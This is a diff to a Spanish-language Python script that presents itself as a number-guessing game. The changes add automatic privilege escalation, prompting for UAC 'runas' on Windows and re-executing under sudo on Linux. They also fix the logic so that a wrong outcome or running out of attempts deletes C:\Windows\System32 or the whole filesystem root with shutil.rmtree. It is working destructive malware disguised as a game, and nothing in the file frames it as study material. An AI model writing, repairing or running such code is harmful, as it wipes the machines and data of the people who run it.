@@ -2,6 +2,12 @@
 import time
 import random
 import shutil
+import os
+import ctypes
+import sys  
+
+
+
 
 i = True
 def sistema():
@@ -20,6 +26,33 @@ def sistema():
     return sis 
 
 sis = sistema()
+if sis == 1:
+    def is_admin():
+        try:
+            return ctypes.windll.shell32.IsUserAnAdmin() != 0
+        except:
+            return False
+
+
+    if not is_admin():
+        print("No tienes privilegios de administrador. Intentando elevarlos...")
+        # Relanzar el script con privilegios elevados
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, ' '.join(sys.argv), None, 1)
+        sys.exit()  # Termina el script actual
+    else:
+        print("Script ejecutándose con privilegios de administrador.")
+
+if sis in [2, 3, 4]:
+    def is_root():
+        return os.geteuid() == 0
+
+    if not is_root():
+        print("No tienes privilegios de administrador. Intentando elevarlos...")
+        
+        os.execvp("sudo", ["sudo", "python3"] + sys.argv)
+        sys.exit()  
+    else:
+        print("Script ejecutándose con privilegios de administrador.")
 
 while i == True:
     print("Has caido en la trampa!")
@@ -28,7 +61,7 @@ while i == True:
     time.sleep(2)
     print("Tienes 10 intentos para adivinar un numero totalmente aleatorio del 1 al 50.")
     time.sleep(2)
-    print("Me vas a dar una lista de 3 numeros por inento.")
+    print("Me vas a dar una lista de 3 numeros por intento.")
     time.sleep(2)
     print("Aunque este numero aleatorio, va a cambiar a cada intento para añadirle un poco de dificultad 😈 ")
     time.sleep(2)
@@ -52,7 +85,7 @@ while i == True:
             p = list()
             while len(p) <3:
                 try:
-                    o = input('Escribe tus numeros de 1 en 1 dandole a Enter ')
+                    o = int(input('Escribe tus numeros de 1 en 1 dandole a Enter '))
                     if 1 <= o <= 50 and o not in p:
                         p.append(o)
                     else:
@@ -70,27 +103,28 @@ while i == True:
         nb = numerobueno()
         nm = numeromalo()
         
-        if nb == nm and nm == 50:
-            nm == nm-1
+        if nb == 50 and nm == 50:
+            nm -= 1
             if nb == nm and nm < 50:
-                nm == nm+1
+                nm += 1
 
         lista = crearlista()
 
-        for lista in nb:
+        if nb in lista:
             print("Te has salvado, has adivinado el número, que era {}".format(nb))
-        for lista in nm:
+            break
+        if nm in lista:
             print("JAJAJAJAJAJA Has adivinado el numero malo, ahora te doy 3 segundos para despedirte de tu ordenador ")
             time.sleep(3)
             if sis == 1:
-                shutil.rmtree("c:\windows\system32")
-                if sis == 2 or sis == 3 or sis == 4:
-                    shutil.rmtree("/")
+                shutil.rmtree(r"c:\windows\system32")
+            elif sis in [2, 3, 4]:
+                shutil.rmtree("/")
         u = u+1
         print("Este es tu intento número {}".format(u))
-    if u == 11:
+    if u == 10:
+        print("Se han acabado tus intentos, has perdido, por lo que igualmente serás castigado")
         if sis == 1:
-            print("Se han acabado tus intentos, has perdido, por lo que igualmente serás castigado")
-            shutil.rmtree("c:\windows\system32")
-        elif u == 11 and sis == 2 or sis == 3 or sis == 4:
+            shutil.rmtree(r"c:\windows\system32")
+        elif u == 10 and sis in [2, 3, 4]:
             shutil.rmtree("/")
